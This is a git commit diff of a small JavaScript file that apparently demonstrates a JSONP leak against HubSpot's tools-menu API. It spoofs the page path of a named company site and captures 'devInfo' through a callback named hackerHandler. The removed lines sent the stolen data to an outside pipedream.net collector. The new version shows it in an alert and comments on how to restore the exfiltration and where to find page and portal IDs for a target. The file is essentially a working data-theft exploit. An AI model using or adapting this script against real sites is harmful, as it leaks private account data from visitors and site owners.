3344367c4570779ff1327eb2d9837b3db438de24
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-23 22:26:02 +0100

    Update test.js

--- assets/javascript/test.js
+++ assets/javascript/test.js
@@ -1,16 +1,14 @@
-window.history.replaceState(null, '', '/attacker');
+window.history.replaceState(null, '', '/partner-tech'); // for demo purpose we are targeting https://www.contrastsecurity.com/partner-tech
 
 function hackerHandler(e) {
-	var devInfo = e.actions[4][1]
-	var xhr = new XMLHttpRequest();
-	xhr.open('GET', 'https://en4up0v4ttgwllq.m.pipedream.net/?devInfo='+devInfo) // change by your url
-	xhr.send()
+    var devInfo = e.actions[4][1]
+    alert(devInfo); // You can change the alert to a code that sends an XHR request to your remote server with the stolen devInfo as a parameter
 }
 
 o = document.createElement("script");
 o.type = "text/javascript";
 o.referrerPolicy = "no-referrer-when-downgrade";
 o.async = !0;
-o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=hackerHandler";
+o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/64848245021/actions?portalId=203759&callback=hackerHandler"; // your page id and portal ID could be found in the targeted page source code
 document.getElementsByTagName("head")[0].appendChild(o)
 
